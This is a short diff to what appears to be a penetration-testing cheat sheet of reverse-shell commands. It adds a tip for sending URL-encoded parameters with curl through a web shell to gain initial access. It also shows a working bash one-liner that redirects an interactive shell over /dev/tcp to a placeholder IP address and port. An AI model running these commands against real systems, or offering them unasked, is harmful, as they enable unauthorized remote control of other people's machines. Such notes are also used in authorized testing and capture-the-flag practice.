@@ -19,6 +19,13 @@ run
 
 Note: Sometimes need to sh or bash -c 'revshell' for these to work.
 
+Other Note: Can curl --data-urlencode params
+```
+curl http://target/file --data-urlencode "paramname=paramvalue"
+
+Great for initial access via revshells through web shells.
+```
+
 sh -i
 `sh -i >& /dev/tcp/ipaddress/port 0>&1`
 
